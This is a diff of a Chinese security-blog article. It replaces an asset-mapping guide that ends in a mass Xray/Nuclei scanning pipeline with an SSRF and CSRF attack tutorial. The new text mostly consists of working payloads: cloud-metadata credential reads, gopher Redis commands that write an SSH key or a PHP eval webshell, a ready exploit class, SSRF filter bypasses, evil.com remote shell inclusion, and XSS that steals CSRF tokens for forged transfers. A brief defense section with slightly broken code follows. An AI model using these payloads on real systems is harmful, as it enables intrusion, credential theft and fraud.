@@ -1,293 +1,299 @@
-# 资产测绘与批量打点（FOFA/Shodan/Quake/鹰图实战）
+# 渗透测试战术：SSRF 攻击与 CSRF 跨站请求伪造深度实战
 
-> 资产测绘是红队行动的第一步。本文系统介绍 FOFA、Shodan、Quake、鹰图（ZoomEye）四大平台的高级搜索语法、API 自动化、多源合并去重，以及如何把测绘结果对接 Xray / Nuclei 做批量打点。
+> 📅 2026-06-12 | 🎯 精通 | ⏱ 25 min | 分类：渗透测试
 
-## 1. 四大平台对比
+## 📋 提纲
 
-| 平台 | 定位 | 优点 | 缺点 | 推荐指数 |
-|------|------|------|------|------|
-| **FOFA** | 中文资产测绘（fofa.info） | 国内资产覆盖最全面，语法直观 | 免费额度有限 | ★★★★★ |
-| **Shodan** | 全球网络空间搜索引擎（shodan.io） | 端口/服务指纹极细，数据量大 | 国内站点不如 FOFA 全 | ★★★★☆ |
-| **Quake** | 360 网络空间测绘（quake.360.net） | 响应体/证书/JS 可全文检索 | 社区模板较少 | ★★★★☆ |
-| **ZoomEye（鹰图）** | 知道创宇网络空间搜索引擎（zoomeye.org） | Web / Host 双模式，和 Seebug 联动 | 部分高级语法偏冷门 | ★★★☆☆ |
+1. SSRF 漏洞原理
+2. SSRF 利用场景与技巧
+3. SSRF 绕过防火墙与协议
+4. SSRF 在内网渗透中的应用
+5. CSRF 漏洞原理与利用
+6. CSRF Token 绕过技术
+7. 防御方案
 
-### 1.1 四平台通用搜索思路
+---
 
-1. **从根域名出发**：`domain="target.com"`（FOFA/Quake/ZoomEye）、`ssl:target.com`（Shodan）；
-2. **从 ICP / 注册单位出发**：`icp="京ICP备XXXX号"`、`cert="target company"`；
-3. **从证书反查**：`cert.subject="target.com"`、`cert="-----BEGIN CERTIFICATE-----"`；
-4. **从 ASN 出发**：`asn="AS12345"`、`org="target ltd"`；
-5. **从 title/body 关键字反查**：`title="后台管理系统"`、`body="Powered by"`。
+## 1. SSRF 漏洞原理
 
-## 2. FOFA 高级语法与实战
-
-FOFA 是国内最常用的资产测绘平台，支持 `domain`、`host`、`ip`、`cert`、`title`、`body`、`icp`、`city`、`port`、`banner`、`app`、`os`、`country` 等关键字。
-
-### 2.1 核心语法速查
+SSRF(Server-Side Request Forgery)：服务端请求伪造——让服务端替你访问内网资源。
 
 ```
-# 根域名 + 子域名
-domain="target.com"
+攻击者 → Web服务器 → 内网资源(Redis/MySQL/Metadata/AWS/Aliyun元数据)
 
-# 证书包含 target.com（可命中泛域名）
-cert="target.com"
-
-# 标题
-title="后台管理系统"
-
-# 页面正文包含特定字符串
-body="thinkphp" && country="CN"
-
-# ICP 备案号（强力手段）
-icp="京ICP备2020000000号"
-
-# 端口限定
-port="8080" || port="8443"
-
-# 指纹（由 FOFA 识别）
-app="Spring Boot Actuator"
-app="Jenkins"
-app="Druid Monitor"
-app="Node-RED"
-app="Apache Tomcat" && status_code="200"
-
-# 国家/城市
-country="CN" && city="beijing"
-
-# 组合：国内暴露在公网的 Jenkins 未授权访问
-title="Dashboard [Jenkins]" && body="Dashboard [Jenkins]" && country="CN"
+利用场景：
+1. 访问内网服务（Redis/MySQL/Elasticsearch）
+2. 读取云元数据（AWS/阿里云/腾讯云）
+3. 端口扫描内网
+4. 读取本地文件(file://)
+5. 利用Gopher协议攻击内网服务
 ```
 
-### 2.2 FOFA Pro API 使用
-
-```python
-import requests, json
-
-API_KEY = "your-fofa-api-key"
-EMAIL   = "your@mail.com"
-QUERY   = 'domain="target.com" && status_code="200"'
-PAGE    = 1
-SIZE    = 100
-
-resp = requests.get("https://fofa.info/api/v1/search/all", params={
-    "email": EMAIL,
-    "key": API_KEY,
-    "qbase64": __import__("base64").b64encode(QUERY.encode()).decode(),
-    "page": PAGE,
-    "size": SIZE,
-    "fields": "host,ip,port,title,domain,server",
-})
-data = resp.json()
-for item in data.get("results", []):
-    print(" | ".join(item))
-```
-
-**fields** 可选字段：`ip,port,protocol,country_name,region,city,longitude,latitude,as_number,as_organization,host,domain,os,server,icp,title,jarm,certs_match,timestamp,cert`。
-
-## 3. Shodan 搜索与 API
-
-Shodan 主打「服务 banner 索引」，对 IoT、工控、RDP、SSH、Redis 等非 Web 资产覆盖极佳。
-
-### 3.1 常用 Shodan 过滤符
+### 1.1 常见触发点
 
 ```
-# 主机名/域名
-hostname:target.com
-ssl:"target.com"
+1. URL获取功能
+   ?url=http://evil.com  (图片代理/URL预览/网页截图)
 
-# 产品指纹
-product:"nginx"
-product:"Microsoft IIS httpd"
+2. 文件导入
+   ?file=http://evil.com/shell.php  (远程文件包含)
 
-# 端口
-port:22
-port:3389
-port:6379
+3. Webhook/回调
+   ?callback=http://evil.com
 
-# HTTP 标题/正文
-http.title:"Dashboard"
-http.html:"wp-admin"
-
-# 地理位置
-country:CN
-city:Beijing
-
-# 组织/ASN
-org:"Target Company"
-asn:AS12345
-
-# 组合：暴露在公网的 Redis 且无密码
-product:"redis" port:6379 -"\\"NOAUTH\\""
+4. API集成
+   请求体中含URL参数
 ```
 
-### 3.2 Shodan CLI 批量导出
+---
+
+## 2. SSRF 利用技巧
+
+### 2.1 云元数据读取
 
 ```bash
-# 安装
-pip install shodan
-shodan init <your-api-key>
+# AWS EC2 元数据
+curl "http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/"
+curl "http://target.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+curl "http://target.com/proxy?url=http://169.254.169.254/latest/user-data/"
 
-# 搜索并下载前 1000 条
-shodan download --limit 1000 target.json.gz 'hostname:target.com'
+# 阿里云 ECS 元数据
+curl "http://target.com/proxy?url=http://100.100.100.200/latest/meta-data/"
+curl "http://target.com/proxy?url=http://100.100.100.200/latest/meta-data/ram/security-credentials/"
 
-# 解析为 IP:PORT 列表
-shodan parse --fields ip_str,port --separator ':' target.json.gz > shodan-targets.txt
+# 腾讯云 CVM 元数据
+curl "http://target.com/proxy?url=http://metadata.tencentyun.com/latest/meta-data/"
 ```
 
-## 4. Quake（360）与鹰图 ZoomEye
-
-### 4.1 Quake 特色语法
-
-Quake 对响应体内容做了全文索引，支持 `app:`、`cert:`、`favicon.hash:`、`body:`、`header:`、`hostname:` 等。
-
-```
-# 响应体包含敏感字符串
-response:"root:" AND response:":/bin/bash"
-
-# favicon 哈希
-favicon:"-1555279520"
-
-# 证书
-cert:"target.com" cert:"Let's Encrypt"
-
-# 资产组合（域名 + IP 段）
-domain:"target.com" OR ip:"1.2.3.0/24"
-```
-
-### 4.2 ZoomEye 特色语法
-
-ZoomEye 区分 `web` 和 `host` 两个维度：
-
-```
-# Web 搜索
-iconhash:"-1555279520"
-title:"后台"
-site:target.com
-app:"Jenkins"
-
-# Host 搜索
-port:3306
-service:"mysql"
-app:"MySQL" country:"CN"
-
-# 登录后 API 调用
-curl -X POST https://api.zoomeye.org/user/login \
-     -H 'Content-Type: application/json' \
-     -d '{"username":"you@mail.com","password":"xxx"}'
-```
-
-## 5. 多源合并与去重工作流
-
-在实际项目中，我们通常同时调用 3~4 个平台 API，然后做合并去重。以下是推荐工作流：
-
-```
-1. 以根域名、ICP、组织名为起点，在 4 个平台分别搜索
-2. 将结果统一成 "http(s)://host:port" 或 "IP:PORT" 格式
-3. 用 httpx 做存活探测 + title 提取
-4. 去重（去 URL、去标题重复的管理后台、去 favicon hash 相同的重复站点）
-5. 交付给 Xray / Nuclei 做批量扫描
-```
-
-### 5.1 合并去重脚本示例
+### 2.2 协议利用
 
 ```bash
-# 1. 分别从各平台导出 URL 列表（每行一个 http(s)://...）
-cat fofa.txt shodan.txt quake.txt zoomeye.txt | sort -u > raw.txt
+# file:// 协议 - 读取本地文件
+?url=file:///etc/passwd
+?url=file:///c:/windows/win.ini
+?url=file:///var/www/html/config.php
 
-# 2. 用 httpx 做存活探测，导出标题/状态码
-httpx -l raw.txt -silent -title -status-code -fc 404,502 -o alive.txt
+# dict:// 协议 - 探测端口
+?url=dict://127.0.0.1:6379/info    # Redis
+?url=dict://127.0.0.1:3306/        # MySQL
 
-# 3. 按 favicon hash 去重（同指纹保留一个代表）
-cat alive.txt | awk -F '\\[' '{print $1}' | sort -u > unique-alive.txt
+# gopher:// 协议 - 攻击内网服务
+# 攻击 Redis (未授权访问)
+?url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$4%0d%0atest%0d%0a$5%0d%0ahello%0d%0a
+# 降级为: SET test hello
 
-# 4. 交付给 Nuclei 批量扫描
-nuclei -l unique-alive.txt -t ~/nuclei-templates/ \
-       -s critical,high -rl 100 -o nuclei-result.jsonl -j
+# 通过Redis写入SSH公钥
+?url=gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$...<public_key>...%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
 ```
 
-### 5.2 常用工具组合
-
-| 工具 | 用途 |
-|------|------|
-| **OneForAll** | 子域名爆破（DNS / HTTPS / Certificate Transparency） |
-| **Amass** | OSINT 资产收集，子域名主动/被动双模式 |
-| **Subfinder** | 被动子域名收集（支持 VirusTotal / SecurityTrails 等源） |
-| **httpx** | HTTP 存活探测 + 状态码 + title + 指纹 |
-| **naabu** | 端口扫描（TCP SYN，比 nmap 快） |
-| **fav-up** | favicon hash 反查（Shodan/FOFA 语法自动生成） |
-| **EHole / Glass / Finger** | 应用指纹识别 |
-
-## 6. API 自动化实战：FOFA + httpx + Xray 全链路
-
-下面给出一个完整的 Python 脚本，演示从 **FOFA API 拉资产 → httpx 存活探测 → Xray 批量扫描 → Nuclei 漏洞扫描** 的完整链路。
+### 2.3 绕过SSRF限制
 
 ```python
-import requests, base64, subprocess, os
+#!/usr/bin/env python3
+"""SSRF 绕过技巧"""
 
-FOFA_EMAIL = "your@mail.com"
-FOFA_KEY   = "your-fofa-key"
-TARGET_DOMAIN = "target.com"
-QUERY = f'domain="{TARGET_DOMAIN}" && status_code="200"'
+BYPASS_TECHNIQUES = {
+    # 1. IP限制绕过
+    "ip_encoding": {
+        "127.0.0.1": [
+            "2130706433",           # 十进制
+            "0x7f000001",          # 十六进制
+            "0x7f.0x00.0x00.0x01", # 混合
+            "0177.0.0.1",          # 八进制
+            "127.0.0.1.nip.io",    # nip.io 泛域名解析
+            "127.1",               # 短格式
+        ],
+        "localhost": [
+            "localhost",
+            "[::1]",               # IPv6
+            "0.0.0.0",
+            "127.127.127.127",
+            "0177.0177.0177.0177",
+        ]
+    },
 
-def fofa_search(query, page=1, size=500):
-    b64 = base64.b64encode(query.encode()).decode()
-    r = requests.get("https://fofa.info/api/v1/search/all", params={
-        "email": FOFA_EMAIL, "key": FOFA_KEY,
-        "qbase64": b64, "page": page, "size": size,
-        "fields": "url",
-    }, timeout=30)
-    return [item[0] for item in r.json().get("results", [])]
+    # 2. URL限制绕过
+    "url_encoding": [
+        "http://evil.com@127.0.0.1",           # @符号混淆
+        "http://127.0.0.1#@evil.com",          # #注释
+        "http://evil.com%23@127.0.0.1",        # URL编码#
+        "http://127.0.0.1%20@evil.com",        # 空格
+        "http://127.0.0.1:80@evil.com",        # 端口@域名
+    ],
 
-assets = fofa_search(QUERY)
-with open("fofa-assets.txt", "w") as f:
-    f.write("\n".join(assets))
+    # 3. 重定向绕过
+    "redirect": [
+        "让evil.com 302跳转到 127.0.0.1",
+    ],
 
-# 存活探测（需系统已安装 httpx）
-subprocess.run(["httpx", "-l", "fofa-assets.txt", "-silent", "-o", "alive.txt"])
+    # 4. DNS重绑定
+    "dns_rebinding": [
+        "使用DNS TTL=0，第一次解析为合法IP，第二次解析为127.0.0.1",
+    ],
+}
 
-# Xray 批量扫描（需系统已安装 xray）
-subprocess.run([
-    "./xray", "webscan",
-    "--url-file", "alive.txt",
-    "--html-output", "xray-report.html",
-])
+def generate_ssrf_payloads(target_internal="127.0.0.1", port=6379):
+    payloads = []
 
-# Nuclei 批量扫描
-subprocess.run([
-    "nuclei", "-l", "alive.txt",
-    "-t", "~/nuclei-templates/",
-    "-s", "critical,high",
-    "-o", "nuclei-report.jsonl", "-j",
-])
+    # 基础payloads
+    payloads.append(f"http://{target_internal}:{port}/")
+
+    # 十进制IP
+    ip_parts = target_internal.split('.')
+    decimal_ip = int(ip_parts[0])*256**3 + int(ip_parts[1])*256**2 + int(ip_parts[2])*256 + int(ip_parts[3])
+    payloads.append(f"http://{decimal_ip}:{port}/")
+
+    # 十六进制
+    hex_ip = '0x' + ''.join(f'{int(p):02x}' for p in ip_parts)
+    payloads.append(f"http://{hex_ip}:{port}/")
+
+    # DNS重绑定
+    payloads.append(f"http://{target_internal}.nip.io:{port}/")
+
+    return payloads
 ```
 
-## 7. 典型场景：从 ICP 号出发的企业画像
+---
+
+## 3. SSRF 内网利用链
+
+```python
+#!/usr/bin/env python3
+"""SSRF → 内网服务攻击自动化"""
+
+class SSRFInternalExploit:
+    def __init__(self, ssrf_endpoint):
+        self.endpoint = ssrf_endpoint
+
+    def scan_internal_ports(self, ip_range="10.0.0.0/24", ports=[22,6379,3306,9200,27017]):
+        """通过SSRF扫描内网端口"""
+        results = []
+        # 通过响应时间/内容差异判断端口是否开放
+        for port in ports:
+            payload = f"http://{ip_range.split('/')[0].rsplit('.',1)[0]}.1:{port}/"
+            resp = self.send_ssrf(payload)
+            results.append({"target": f"{ip_range}:{port}", "open": resp.get('status') != 'timeout'})
+        return results
+
+    def exploit_redis(self, internal_ip):
+        """通过SSRF攻击内网Redis"""
+
+        # 1. 写入WebShell到/var/www/html/
+        webshell = '<?php @eval($_POST["cmd"]);?>'
+        payload = f"gopher://{internal_ip}:6379/_*3%0d%0a$3%0d%0aset%0d%0a$4%0d%0ashell%0d%0a${self.url_encode(webshell)}%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a"
+        return self.send_ssrf(payload)
+
+    def exploit_mysql(self, internal_ip):
+        """通过SSRF攻击内网MySQL"""
+        # Gopher协议构造MySQL认证包
+        # 前提：MySQL允许任意主机连接
+        pass
+
+    def send_ssrf(self, payload):
+        import requests
+        try:
+            resp = requests.post(self.endpoint, data={"url": payload}, timeout=10)
+            return {"status": "ok", "response": resp.text[:200]}
+        except:
+            return {"status": "timeout"}
+```
+
+---
+
+## 4. CSRF 漏洞原理
+
+CSRF：诱导受害者点击链接→以受害者身份执行非本意操作。
 
 ```
-1. 通过站长之家 / 天眼查 / ICP 查询，获取目标公司所有备案域名；
-2. 逐个域名做 FOFA：domain="target.com"、cert="target.com"、icp="xxx"；
-3. 导出 Shodan：ssl:target.com hostname:target.com org:"Target Ltd"；
-4. 导出 Quake：domain:"target.com"；
-5. 合并、去重、httpx 探活；
-6. 按 favicon hash 归并同类系统（一套后台可能被多个域名复用）；
-7. 对典型后台（Jenkins / Druid / Grafana / Kibana / Swagger / Solr）做重点人工测试。
+攻击者诱导受害者点击：
+<img src="http://bank.com/transfer?to=attacker&amount=10000">
+→ 受害者浏览器自动发出请求（带上bank.com的Cookie）
+→ 转账成功
 ```
 
-## 8. 注意事项与合规提醒
+### 4.1 CSRF Token 绕过
 
-- 资产测绘本身只是 **被动信息收集**，不涉及对目标的主动攻击；
-- 在 **未获得授权** 的情况下，请勿对测绘结果做进一步扫描或攻击；
-- 大型企业的子域名数量可能破万，请配合 `-rl`（速率限制）控制扫描压力；
-- 尊重目标的 robots 与节流策略，避免触发 429 / WAF；
-- 测绘结果可能包含第三方资产（CDN、SaaS），需人工剔除。
+```html
+<!-- 方法1: 通过XSS窃取Token -->
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('GET', '/profile', true);
+xhr.onload = function() {
+    var token = xhr.responseText.match(/csrf_token" value="([^"]+)"/)[1];
+    // 盗取token后发起CSRF攻击
+    document.write('<img src="/transfer?to=attacker&amount=10000&token='+token+'">');
+};
+xhr.send();
+</script>
 
-## 9. 进一步学习
+<!-- 方法2: Token未与Session绑定 -->
+<!-- 有些系统Token是固定的，攻击者获取自己的Token即可用于攻击其他人 -->
 
-- **FOFA 官方文档**：https://fofa.info/api
-- **Shodan 官方手册**：https://beta.shodan.io/search/filters
-- **ZoomEye API**：https://www.zoomeye.org/doc
-- **Quake 使用手册**：https://quake.360.net/quake/doc
-- **资产测绘工具链**：OneForAll / Amass / Subfinder / httpx / naabu
-- **指纹识别工具**：EHole / Glass / Finger / TideFinger
+<!-- 方法3: 修改请求方法绕过 -->
+<!-- 如果POST有Token但GET没有 -->
+<img src="/transfer?to=attacker&amount=10000">
 
-掌握四大平台 + 自动化脚本 + 指纹归并思路后，基本可以在 1~2 天内完成一家中大型企业的初步资产画像，为后续外网打点和定向攻击打下坚实基础。
+<!-- 方法4: JSON格式绕过 -->
+<!-- 如果服务端同时接受form-urlencoded和JSON -->
+<script>
+fetch('/transfer', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({to:'attacker', amount:10000})
+});
+</script>
+```
+
+---
+
+## 5. 防御方案
+
+**SSRF防御**：
+```python
+# 服务端URL白名单
+ALLOWED_HOSTS = ['api.trusted.com', 'cdn.trusted.com']
+
+def validate_url(url):
+    parsed = urlparse(url)
+    
+    # 只允许HTTP/HTTPS
+    if parsed.scheme not in ['http', 'https']:
+        raise ValueError("Invalid protocol")
+    
+    # 白名单域名
+    if parsed.hostname not in ALLOWED_HOSTS:
+        raise ValueError("Host not allowed")
+    
+    # 禁止内网IP
+    import ipaddress
+    ip = socket.gethostbyname(parsed.hostname)
+    if ipaddress.ip_address(ip).is_private:
+        raise ValueError("Internal IP blocked")
+```
+
+**CSRF防御**：
+```python
+# 1. SameSite Cookie
+Set-Cookie: session=xxx; SameSite=Strict; Secure; HttpOnly
+
+# 2. CSRF Token
+<form>
+    <input type="hidden" name="csrf_token" value="{{ random_token_per_session }}">
+</form>
+
+# 3. Origin/Referer 校验
+if request.headers.get('Origin') not in ALLOWED_ORIGINS:
+    return 403
+```
+
+---
+
+## ✅ SSRF + CSRF Checklist
+
+- [ ] SSRF检测：所有URL/Fetch/Import功能点
+- [ ] SSRF绕过：IP编码/DNS重绑定/重定向
+- [ ] 内网元数据访问测试
+- [ ] CSRF：所有状态变更操作(转账/修改密码/删除)
+- [ ] CSRF Token生成与验证机制审计
+
+> 📚 延伸阅读：Penetration/001-Web流程 | Penetration/003-SQL注入 | CodeAudit/001-PHP审计
